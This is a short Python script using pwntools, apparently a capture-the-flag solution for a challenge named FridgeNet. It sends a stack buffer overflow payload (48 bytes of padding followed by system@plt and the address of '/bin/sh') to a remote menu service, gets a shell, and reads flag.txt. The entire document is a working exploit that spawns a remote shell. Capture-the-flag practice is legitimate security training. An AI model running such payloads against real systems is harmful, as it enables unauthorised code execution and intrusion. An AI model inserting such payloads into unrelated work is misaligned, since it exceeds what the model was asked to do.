#!/usr/bin/env python3
"""Automated script to obtain the FridgeNet flag"""
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

HOST = 'chall.0xfun.org'
PORT = 63809

elf = ELF('./vuln', checksec=False)

# Addresses
system_plt = elf.plt['system']
binsh = next(elf.search(b'/bin/sh\x00'))

# Payload
offset = 48
payload = flat(
    b'A' * offset,
    system_plt,
    0x41414141,
    binsh
)

log.info(f"Exploiting {HOST}:{PORT}...")

# Connect and exploit
p = remote(HOST, PORT)
p.recvuntil(b'>')
p.sendline(b'2')
p.recvuntil(b':')
p.sendline(payload)

# Get flag
log.info("Obtaining flag...")
p.sendline(b'cat flag.txt')
time.sleep(0.5)
flag = p.recv(timeout=2).decode().strip()

log.success(f"FLAG: {flag}")
p.close()

print(f"\n{flag}")
